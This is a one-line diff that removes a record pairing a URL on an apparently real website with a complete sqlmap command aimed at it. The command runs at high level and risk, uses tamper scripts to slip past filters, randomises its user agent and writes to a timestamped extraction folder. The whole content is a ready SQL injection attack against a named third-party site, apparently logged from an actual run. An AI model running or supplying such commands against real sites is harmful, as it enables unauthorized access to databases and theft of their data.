@@ -1,1 +1,0 @@
-https://ngoenmun.com?user=1 (GET)  # C:\Users\Administrator\AppData\Local\Programs\Python\Python311\Scripts\sqlmap -u https://ngoenmun.com?user=1 --batch --level=3 --risk=3 --random-agent --tamper=space2comment,randomcase --output-dir sqlmap_extraction_20251029_022606 --fresh-queries
